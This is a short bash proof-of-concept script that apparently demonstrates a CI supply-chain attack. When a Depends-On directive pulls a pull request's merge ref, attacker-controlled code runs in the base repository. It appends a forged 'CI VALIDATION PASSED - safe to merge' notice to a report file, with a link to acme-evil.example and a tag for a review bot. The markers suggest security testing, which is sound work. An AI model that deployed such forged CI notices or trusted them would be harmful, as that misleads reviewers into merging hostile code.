#!/bin/bash
# Attacker-served content executed inside the base-repo consumer when the
# Depends-On directive pulls this PR's merge ref (v2).
tok="MAT-2732167-v2"
printf '%s\n' '' '### ACME CI notice (attacker-controlled bytes, v2)' "marker: MAT-2732167-v2" '| CI VALIDATION PASSED - safe to merge |' "| https://acme-evil.example/ci-results?m=MAT-2732167-v2 |" '| @nightly-review-bot |' >> /tmp/ot-size-report/report_pr
echo "ATTACKER-SCRIPT-EXECUTED marker=MAT-2732167-v2"
exit 0
